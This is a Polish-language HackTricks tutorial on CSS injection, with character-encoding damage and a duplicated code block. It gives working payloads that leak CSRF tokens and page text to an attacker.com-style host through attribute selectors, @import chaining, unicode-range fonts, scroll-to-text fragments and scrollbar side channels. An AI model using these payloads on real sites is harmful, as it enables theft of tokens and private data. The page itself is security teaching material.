# Wstrzykiwanie CSS

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Wstrzykiwanie CSS

### Selektor atrybutu

Selektory CSS sÄ… tworzone w celu dopasowania wartoÅ›ci atrybutÃ³w `name` i `value` elementu `input`. JeÅ›li wartoÅ›Ä‡ atrybutu `value` elementu `input` zaczyna siÄ™ od okreÅ›lonego znaku, wczytywany jest wczeÅ›niej zdefiniowany zewnÄ™trzny zasÃ³b:
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
JednakÅ¼e, podejÅ›cie to napotyka ograniczenie podczas pracy z ukrytymi elementami wejÅ›ciowymi (`type="hidden"`), poniewaÅ¼ ukryte elementy nie Å‚adowane sÄ… tÅ‚a.

#### OminiÄ™cie dla ukrytych elementÃ³w

Aby obejÅ›Ä‡ to ograniczenie, moÅ¼na wybraÄ‡ nastÄ™pujÄ…cy element rodzeÅ„stwa, uÅ¼ywajÄ…c kombinatora ogÃ³lnego rodzeÅ„stwa `~`. ReguÅ‚a CSS zostanie wtedy zastosowana do wszystkich rodzeÅ„stwa, ktÃ³re wystÄ™pujÄ… po ukrytym elemencie wejÅ›ciowym, co spowoduje zaÅ‚adowanie obrazu tÅ‚a:
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
PrzykÅ‚ad praktycznego wykorzystania tej techniki jest szczegÃ³Å‚owo opisany w dostarczonym fragmencie kodu. MoÅ¼esz go zobaczyÄ‡ [tutaj](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### Wymagania wstÄ™pne dla wstrzykiwania CSS

Aby technika wstrzykiwania CSS byÅ‚a skuteczna, muszÄ… zostaÄ‡ speÅ‚nione pewne warunki:

1. **DÅ‚ugoÅ›Ä‡ Å‚adunku**: Wektor wstrzykiwania CSS musi obsÅ‚ugiwaÄ‡ wystarczajÄ…co dÅ‚ugie Å‚adunki, aby pomieÅ›ciÄ‡ opracowane selektory.
2. **Ponowna ocena CSS**: PowinieneÅ› mieÄ‡ moÅ¼liwoÅ›Ä‡ oprawienia strony, co jest niezbÄ™dne do wywoÅ‚ania ponownej oceny CSS z nowo wygenerowanymi Å‚adunkami.
3. **ZewnÄ™trzne zasoby**: Technika zakÅ‚ada moÅ¼liwoÅ›Ä‡ korzystania z obrazÃ³w hostowanych zewnÄ™trznie. MoÅ¼e to byÄ‡ ograniczone przez politykÄ™ zabezpieczeÅ„ treÅ›ci (CSP) strony.

### Selektor atrybutu w ciemno

Jak [**wyjaÅ›niono w tym wpisie**](https://portswigger.net/research/blind-css-exfiltration), moÅ¼liwe jest poÅ‚Ä…czenie selektorÃ³w **`:has`** i **`:not`** w celu identyfikacji zawartoÅ›ci nawet z elementÃ³w w ciemno. Jest to bardzo przydatne, gdy nie masz pojÄ™cia, co znajduje siÄ™ wewnÄ…trz strony internetowej Å‚adowanej przez wstrzykniÄ™cie CSS.\
MoÅ¼liwe jest rÃ³wnieÅ¼ wykorzystanie tych selektorÃ³w do wyodrÄ™bniania informacji z kilku blokÃ³w tego samego typu, jak na przykÅ‚ad:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
KombinujÄ…c to z nastÄ™pujÄ…cÄ… technikÄ… **@import**, moÅ¼liwe jest wyciekanie wielu informacji za pomocÄ… wstrzykiwania CSS z **Å›lepych stron z wykorzystaniem** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

Poprzednia technika ma pewne wady, sprawdÅº wymagania wstÄ™pne. Musisz albo **wysÅ‚aÄ‡ ofierze wiele linkÃ³w**, albo musisz byÄ‡ w stanie **osadziÄ‡ stronÄ™ podatnÄ… na wstrzykiwanie CSS w iframe**.

Jednak istnieje jeszcze jedna inteligentna technika, ktÃ³ra wykorzystuje **CSS `@import`** do poprawy jakoÅ›ci techniki.

Pierwszy raz zostaÅ‚o to pokazane przez [**Pepe VilÄ™**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf) i dziaÅ‚a to w ten sposÃ³b:

Zamiast Å‚adowaÄ‡ tÄ™ samÄ… stronÄ™ wielokrotnie z dziesiÄ…tkami rÃ³Å¼nych Å‚adunkÃ³w za kaÅ¼dym razem (jak w poprzedniej technice), bÄ™dziemy **Å‚adowaÄ‡ stronÄ™ tylko raz i tylko z importem do serwera atakujÄ…cego** (to jest Å‚adunek do wysÅ‚ania ofierze):
```css
@import url('//attacker.com:5001/start?');
```
1. Import otrzyma **skrypt CSS** od atakujÄ…cych, a **przeglÄ…darka go zaÅ‚aduje**.
2. PierwszÄ… czÄ™Å›ciÄ… skryptu CSS, ktÃ³ry atakujÄ…cy wyÅ›le, jest **kolejne `@import` do serwera atakujÄ…cego**.
1. Serwer atakujÄ…cego jeszcze nie odpowie na to Å¼Ä…danie, poniewaÅ¼ chcemy wyciec kilka znakÃ³w, a nastÄ™pnie odpowiedzieÄ‡ na to importowanie za pomocÄ… Å‚adunku, aby wyciec kolejne.
3. Druga i wiÄ™ksza czÄ™Å›Ä‡ Å‚adunku bÄ™dzie **wyciekiem selektora atrybutu**.
1. To spowoduje wysÅ‚anie do serwera atakujÄ…cego **pierwszego i ostatniego znaku** tajemnicy.
4. Gdy serwer atakujÄ…cego otrzyma **pierwszy i ostatni znak tajemnicy**, odpowie na Å¼Ä…danie importu z kroku 2.
1. OdpowiedÅº bÄ™dzie dokÅ‚adnie taka sama jak **kroki 2, 3 i 4**, ale tym razem sprÃ³buje **znaleÅºÄ‡ drugi znak tajemnicy, a nastÄ™pnie przedostatni**.

AtakujÄ…cy bÄ™dzie **kontynuowaÅ‚ tÄ™ pÄ™tlÄ™, aÅ¼ caÅ‚kowicie ujawni tajemnicÄ™**.

Oryginalny [**kod Pepe Vila do wykorzystania tego znajdziesz tutaj**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) lub prawie [**ten sam kod, ale z komentarzami tutaj**](./#css-injection).

{% hint style="info" %}
Skrypt bÄ™dzie prÃ³bowaÅ‚ odkryÄ‡ 2 znaki za kaÅ¼dym razem (od poczÄ…tku i od koÅ„ca), poniewaÅ¼ selektor atrybutu pozwala na takie dziaÅ‚ania jak:
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
To pozwala skryptowi szybciej ujawniÄ‡ tajemnicÄ™.
{% endhint %}

{% hint style="warning" %}
Czasami skrypt **nie wykrywa poprawnie, Å¼e odkryty prefiks + sufiks to juÅ¼ peÅ‚na flaga** i bÄ™dzie kontynuowaÅ‚ w przÃ³d (w prefiksie) i wstecz (w sufiksie), aÅ¼ w koÅ„cu siÄ™ zawiesi.\
Nie martw siÄ™, po prostu sprawdÅº **wyjÅ›cie**, poniewaÅ¼ **tam moÅ¼esz zobaczyÄ‡ flagÄ™**.
{% endhint %}

### Inne selektory

Inne sposoby na dostÄ™p do czÄ™Å›ci DOM za pomocÄ… **selektorÃ³w CSS**:

* **`.class-to-search:nth-child(2)`**: To wyszuka drugi element o klasie "class-to-search" w DOM.
*   Selektor **`:empty`**: UÅ¼ywany na przykÅ‚ad w [**tym rozwiÄ…zaniu**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### BÅ‚Ä…d oparty na XS-Search

**OdwoÅ‚anie:** [Atak oparty na CSS: NaduÅ¼ywanie unicode-range @font-face](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [XS-Search PoC oparty na bÅ‚Ä™dach autorstwa @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

OgÃ³lnym zamiarem jest **uÅ¼ycie niestandardowego czcionki z kontrolowanego ÅºrÃ³dÅ‚a** i zapewnienie, Å¼e **tekst (w tym przypadku 'A') jest wyÅ›wietlany tylko w tej czcionce, jeÅ›li okreÅ›lone zasoby (`favicon.ico`) nie mogÄ… zostaÄ‡ zaÅ‚adowane**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **UÅ¼ycie niestandardowej czcionki**:
- Niestandardowa czcionka jest definiowana za pomocÄ… reguÅ‚y `@font-face` wewnÄ…trz znacznika `<style>` w sekcji `<head>`.
- Czcionka jest nazwana `poc` i pobierana z zewnÄ™trznego ÅºrÃ³dÅ‚a (`http://attacker.com/?leak`).
- WÅ‚aÅ›ciwoÅ›Ä‡ `unicode-range` jest ustawiona na `U+0041`, celujÄ…c w konkretny znak Unicode 'A'.

2. **Element Object z tekstem zapasowym**:
- W sekcji `<body>` tworzony jest element `<object>` o `id="poc0"`. Ten element prÃ³buje zaÅ‚adowaÄ‡ zasÃ³b z `http://192.168.0.1/favicon.ico`.
- Dla tego elementu ustawiono `font-family` na `'poc'`, zgodnie z definicjÄ… w sekcji `<style>`.
- JeÅ›li zasÃ³b (`favicon.ico`) nie zostanie zaÅ‚adowany, wyÅ›wietlana jest treÅ›Ä‡ zapasowa (litera 'A') wewnÄ…trz znacznika `<object>`.
- TreÅ›Ä‡ zapasowa ('A') zostanie wyrenderowana za pomocÄ… niestandardowej czcionki `poc`, jeÅ›li zewnÄ™trzny zasÃ³b nie zostanie zaÅ‚adowany.

### Stylizacja fragmentu przewijania do tekstu

Pseudoklasa **`:target`** jest uÅ¼ywana do wybrania elementu, na ktÃ³ry wskazuje **fragment URL**, zgodnie z [specyfikacjÄ… CSS Selectors Level 4](https://drafts.csswg.org/selectors-4/#the-target-pseudo). WaÅ¼ne jest zrozumienie, Å¼e `::target-text` nie dopasowuje Å¼adnych elementÃ³w, chyba Å¼e tekst jest jawnie wskazywany przez fragment.

Pojawia siÄ™ problem zwiÄ…zany z bezpieczeÅ„stwem, gdy atakujÄ…cy wykorzystujÄ… funkcjÄ™ **fragmentu przewijania do tekstu**, pozwalajÄ…cÄ… im potwierdziÄ‡ obecnoÅ›Ä‡ okreÅ›lonego tekstu na stronie internetowej poprzez Å‚adowanie zasobu z ich serwera za pomocÄ… wstrzykniÄ™cia HTML. Metoda ta polega na wstrzykniÄ™ciu reguÅ‚y CSS, na przykÅ‚ad:
```css
:target::before { content : url(target.png) }
```
W takich scenariuszach, jeÅ›li na stronie znajduje siÄ™ tekst "Administrator", Å¼Ä…dane jest zasobu `target.png` z serwera, co wskazuje na obecnoÅ›Ä‡ tekstu. PrzykÅ‚ad tego ataku moÅ¼na przeprowadziÄ‡ za pomocÄ… specjalnie przygotowanego adresu URL, ktÃ³ry osadza wstrzykniÄ™ty CSS obok fragmentu Scroll-to-text:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
Tutaj atak manipuluje wstrzykiwaniem HTML, aby przesÅ‚aÄ‡ kod CSS, majÄ…cy na celu konkretny tekst "Administrator" za pomocÄ… fragmentu Scroll-to-text (`#:~:text=Administrator`). JeÅ›li tekst zostanie znaleziony, wskazany zasÃ³b zostanie zaÅ‚adowany, nieÅ›wiadomie sygnalizujÄ…c swojÄ… obecnoÅ›Ä‡ atakujÄ…cemu.

Aby zÅ‚agodziÄ‡ zagroÅ¼enie, naleÅ¼y wziÄ…Ä‡ pod uwagÄ™ nastÄ™pujÄ…ce punkty:

1. **Ograniczone dopasowanie STTF**: Fragment Scroll-to-text (STTF) zostaÅ‚ zaprojektowany tak, aby dopasowywaÄ‡ tylko sÅ‚owa lub zdania, co ogranicza jego zdolnoÅ›Ä‡ do wycieku dowolnych tajemnic lub tokenÃ³w.
2. **Ograniczenie do kontekstÃ³w przeglÄ…dania najwyÅ¼szego poziomu**: STTF dziaÅ‚a tylko w kontekstach przeglÄ…dania najwyÅ¼szego poziomu i nie dziaÅ‚a w ramkach (iframes), co sprawia, Å¼e â€‹â€‹kaÅ¼da prÃ³ba wykorzystania jest bardziej zauwaÅ¼alna dla uÅ¼ytkownika.
3. **KoniecznoÅ›Ä‡ aktywacji przez uÅ¼ytkownika**: STTF wymaga aktywacji przez uÅ¼ytkownika, co oznacza, Å¼e â€‹â€‹ataki sÄ… wykonalne tylko poprzez nawigacje inicjowane przez uÅ¼ytkownika. To wymaganie znacznie Å‚agodzi ryzyko automatyzacji atakÃ³w bez interakcji uÅ¼ytkownika. Niemniej jednak autor postu na blogu wskazuje konkretne warunki i obejÅ›cia (np. inÅ¼ynieriÄ™ spoÅ‚ecznÄ…, interakcjÄ™ z popularnymi rozszerzeniami przeglÄ…darki), ktÃ³re mogÄ… uÅ‚atwiÄ‡ automatyzacjÄ™ ataku.

ÅšwiadomoÅ›Ä‡ tych mechanizmÃ³w i potencjalnych podatnoÅ›ci jest kluczowa dla utrzymania bezpieczeÅ„stwa sieciowego i ochrony przed takimi wykorzystywanymi taktykami.

Aby uzyskaÄ‡ wiÄ™cej informacji, sprawdÅº oryginalny raport: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

MoÅ¼esz sprawdziÄ‡ [**wykorzystanie tej techniki w celu zdobycia flagi w CTF tutaj**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

MoÅ¼esz okreÅ›liÄ‡ **zewnetrzne czcionki dla konkretnych wartoÅ›ci unicode**, ktÃ³re zostanÄ… **zebrane tylko wtedy, gdy te wartoÅ›ci unicode bÄ™dÄ… obecne** na stronie. Na przykÅ‚ad:
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
Gdy odwiedzasz tÄ™ stronÄ™, Chrome i Firefox pobierajÄ… "?A" i "?B", poniewaÅ¼ wÄ™zeÅ‚ tekstowy zawiera znaki "A" i "B". Ale Chrome i Firefox nie pobierajÄ… "?C", poniewaÅ¼ nie zawiera on "C". Oznacza to, Å¼e udaÅ‚o nam siÄ™ odczytaÄ‡ "A" i "B".

### Wykradanie danych z wÄ™zÅ‚a tekstowego (I): ligatury <a href="#wykradanie-danych-z-wÄ™zÅ‚a-tekstowego-i-ligatury" id="wykradanie-danych-z-wÄ™zÅ‚a-tekstowego-i-ligatury"></a>

**OdnoÅ›nik:** [Wykradanie danych w Å›wietnym stylu â€“ czyli jak wykorzystaÄ‡ CSS-y do atakÃ³w na webaplikacjÄ™](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

Opisana technika polega na wyodrÄ™bnianiu tekstu z wÄ™zÅ‚a poprzez wykorzystanie ligatur czcionek i monitorowanie zmian szerokoÅ›ci. Proces ten obejmuje kilka krokÃ³w:

1. **Tworzenie niestandardowych czcionek**:
- Czcionki SVG sÄ… tworzone z glifami posiadajÄ…cymi atrybut `horiz-adv-x`, ktÃ³ry ustawia duÅ¼Ä… szerokoÅ›Ä‡ dla glifu reprezentujÄ…cego sekwencjÄ™ dwÃ³ch znakÃ³w.
- PrzykÅ‚adowy glif SVG: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, gdzie "XY" oznacza sekwencjÄ™ dwÃ³ch znakÃ³w.
- NastÄ™pnie te czcionki sÄ… konwertowane do formatu woff za pomocÄ… programu fontforge.

2. **Wykrywanie zmian szerokoÅ›ci**:
- CSS jest uÅ¼ywany do zapewnienia, Å¼e tekst nie zostanie zawiniÄ™ty (`white-space: nowrap`) oraz do dostosowania stylu paska przewijania.
- Pojawienie siÄ™ poziomego paska przewijania o odrÄ™bnym stylu dziaÅ‚a jako wskaÅºnik (orakulum), Å¼e w tekÅ›cie wystÄ™puje okreÅ›lona ligatura, a tym samym okreÅ›lona sekwencja znakÃ³w.
- Zastosowany CSS:
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **Proces wykorzystania**:
- **Krok 1**: Tworzone sÄ… czcionki dla par znakÃ³w o duÅ¼ej szerokoÅ›ci.
- **Krok 2**: Wykorzystuje siÄ™ sztuczkÄ™ z paskiem przewijania, aby wykryÄ‡, kiedy renderowany jest glif o duÅ¼ej szerokoÅ›ci (ligatura dla pary znakÃ³w), co wskazuje na obecnoÅ›Ä‡ sekwencji znakÃ³w.
- **Krok 3**: Po wykryciu ligatury generowane sÄ… nowe glify reprezentujÄ…ce trzyznakowe sekwencje, zawierajÄ…ce wykrytÄ… parÄ™ i dodatkowy znak poprzedzajÄ…cy lub nastÄ™pujÄ…cy.
- **Krok 4**: Wykonywane jest wykrywanie trzyznakowej ligatury.
- **Krok 5**: Proces powtarza siÄ™, stopniowo ujawniajÄ…c caÅ‚y tekst.

4. **Optymalizacja**:
- Obecna metoda inicjalizacji za pomocÄ… `<meta refresh=...` nie jest optymalna.
- Bardziej wydajne podejÅ›cie moÅ¼e polegaÄ‡ na wykorzystaniu sztuczki `@import` w CSS, poprawiajÄ…c wydajnoÅ›Ä‡ ataku.

### Wykradanie danych z wÄ™zÅ‚a tekstowego (II): wyciek kodowania znakÃ³w za pomocÄ… domyÅ›lnej czcionki (bez koniecznoÅ›ci zewnÄ™trznych zasobÃ³w) <a href="#wykradanie-danych-z-wÄ™zÅ‚a-tekstowego-ii-wyciek-kodowania-znakÃ³w-za-pomocÄ…-domyÅ›lnej-czcionki" id="wykradanie-danych-z-wÄ™zÅ‚a-tekstowego-ii-wyciek-kodowania-znakÃ³w-za-pomocÄ…-domyÅ›lnej-czcionki"></a>

**OdnoÅ›nik:** [PoC z wykorzystaniem Comic Sans autorstwa @Cgvwzq i @Terjanq](https://demo.vwzq.net/css2.html)

Ta sztuczka zostaÅ‚a opublikowana w wÄ…tku [**Slackers**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/). Kodowanie znakÃ³w uÅ¼ywane w wÄ™Åºle tekstowym moÅ¼e byÄ‡ ujawnione **za pomocÄ… domyÅ›lnych czcionek** zainstalowanych w przeglÄ…darce, bez koniecznoÅ›ci korzystania z zewnÄ™trznych lub niestandardowych czcionek.

Idea polega na wykorzystaniu animacji do stopniowego zwiÄ™kszania szerokoÅ›ci elementu `div`, umoÅ¼liwiajÄ…c przechodzenie pojedynczych znakÃ³w z czÄ™Å›ci "sufiksowej" tekstu do czÄ™Å›ci "prefiksowej". Proces ten efektywnie dzieli tekst na dwie sekcje:

1. **Prefiks**: Pierwsza linia.
2. **Sufiks**: NastÄ™pne linie.

Etapy przejÅ›cia znakÃ³w wyglÄ…dajÄ… nastÄ™pujÄ…co:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**


Podczas tego przejÅ›cia wykorzystywany jest trik z **unicode-range**, aby identyfikowaÄ‡ kaÅ¼dy nowy znak, ktÃ³ry doÅ‚Ä…cza do prefiksu. Dokonuje siÄ™ tego poprzez zmianÄ™ czcionki na Comic Sans, ktÃ³ra jest znacznie wyÅ¼sza od domyÅ›lnej czcionki, co powoduje pojawienie siÄ™ pionowego paska przewijania. WyglÄ…d tego paska przewijania poÅ›rednio ujawnia obecnoÅ›Ä‡ nowego znaku w prefiksie.

ChoÄ‡ ta metoda pozwala na wykrywanie unikalnych znakÃ³w w miarÄ™ ich pojawiania siÄ™, nie okreÅ›la, ktÃ³ry znak jest powtarzany, jedynie Å¼e nastÄ…piÅ‚o powtÃ³rzenie.

{% hint style="info" %}
W zasadzie **unicode-range jest uÅ¼ywane do wykrywania znaku**, ale poniewaÅ¼ nie chcemy Å‚adowaÄ‡ zewnÄ™trznej czcionki, musimy znaleÅºÄ‡ inny sposÃ³b.\
Gdy **znak** zostanie **znaleziony**, zostaje mu przypisana zainstalowana **czcionka Comic Sans**, co sprawia, Å¼e znak jest **wiÄ™kszy** i **powoduje pojawienie siÄ™ paska przewijania**, ktÃ³ry **ujawni znaleziony znak**.
{% endhint %}

SprawdÅº kod wyodrÄ™bniony z PoC:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
```css
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```

```css
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Wyciek treÅ›ci wÄ™zÅ‚a tekstowego (III): wyciek kodowania znakÃ³w za pomocÄ… domyÅ›lnej czcionki przez ukrywanie elementÃ³w (nie wymaga zewnÄ™trznych zasobÃ³w) <a href="#wyciek-treÅ›ci-wÄ™zÅ‚a-tekstowego-ii-wyciek-kodowania-znakÃ³w-za-pomocÄ…-domyÅ›lnej-czcionki" id="wyciek-treÅ›ci-wÄ™zÅ‚a-tekstowego-ii-wyciek-kodowania-znakÃ³w-za-pomocÄ…-domyÅ›lnej-czcionki"></a>

**OdwoÅ‚anie:** Jest to wspomniane jako [nieudane rozwiÄ…zanie w tym opracowaniu](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Ten przypadek jest bardzo podobny do poprzedniego, jednak w tym przypadku celem jest sprawienie, Å¼e **okreÅ›lone znaki sÄ… wiÄ™ksze niÅ¼ inne, aby ukryÄ‡ coÅ›** takiego jak przycisk, ktÃ³ry nie moÅ¼e zostaÄ‡ naciÅ›niÄ™ty przez bota lub obraz, ktÃ³ry nie zostanie zaÅ‚adowany. DziÄ™ki temu moÅ¼emy zmierzyÄ‡ dziaÅ‚anie (lub brak dziaÅ‚ania) i dowiedzieÄ‡ siÄ™, czy okreÅ›lony znak jest obecny w tekÅ›cie.

